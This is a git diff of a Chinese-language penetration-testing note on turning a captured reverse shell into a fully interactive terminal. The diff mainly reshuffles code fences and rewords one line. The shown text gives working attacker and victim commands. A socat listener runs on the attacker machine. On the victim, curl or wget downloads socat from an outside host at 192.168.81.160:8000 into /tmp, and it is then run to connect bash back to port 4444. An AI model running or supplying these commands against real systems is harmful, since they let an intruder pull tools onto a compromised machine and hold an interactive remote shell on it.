@@ -55,18 +55,16 @@ export TERM=xterm-256color
 stty rows 54 columns 104
 此时，VPS上的shell为全功能的shell
 ```
-如果拿到的shell执行Ctrl-z会导致退出会话，可考虑使用socat的方案：
+如果拿到的shell执行Ctrl-z会退出会话，可考虑使用socat的方案：
+```
 攻击机：
-```
 socat file:`tty`,raw,echo=0 tcp-listen:4444
-```
 受害机：
-```
 curl -o /tmp/socat http://192.168.81.160:8000/socat 或者 wget -O /tmp/socat http://192.168.81.160:8000/socat
 chmod u+x /tmp/socat
 /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
-```
 此时拿到的shell可以执行删除、可以选择历史命令、可以执行ctlr-c
+```
 
 参考链接：  
 https://www.freebuf.com/vuls/211847.html
